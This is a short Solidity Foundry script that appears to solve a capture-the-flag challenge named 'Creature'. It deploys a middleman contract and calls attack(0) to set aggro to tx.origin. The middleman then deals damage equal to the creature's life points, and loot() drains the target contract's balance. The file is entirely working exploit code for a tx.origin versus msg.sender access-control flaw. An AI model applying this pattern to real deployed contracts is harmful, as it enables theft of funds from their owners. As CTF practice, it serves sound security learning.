// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console2.sol";

// Interface untuk Creature
interface ICreature {
    function lifePoints() external view returns (uint256);
    function attack(uint256 damage) external;
    function loot() external;
}

contract Attack {
    ICreature immutable target;

    constructor(address _target) {
        target = ICreature(_target);
    }

    function win() external {
        target.attack(target.lifePoints());
    }
}

contract Solver is Script {
    address target = vm.envAddress("Target");
    ICreature creature = ICreature(target);

    function run() external {
        uint256 player = vm.envUint("PK");
        vm.startBroadcast(player);
        Attack attacker = new Attack(target);   // middleman contract
        creature.attack(0);     // Set aggro to tx.origin
        attacker.win();         // Attack creature
        creature.loot();        // Loot creature, make balance 0
    }
}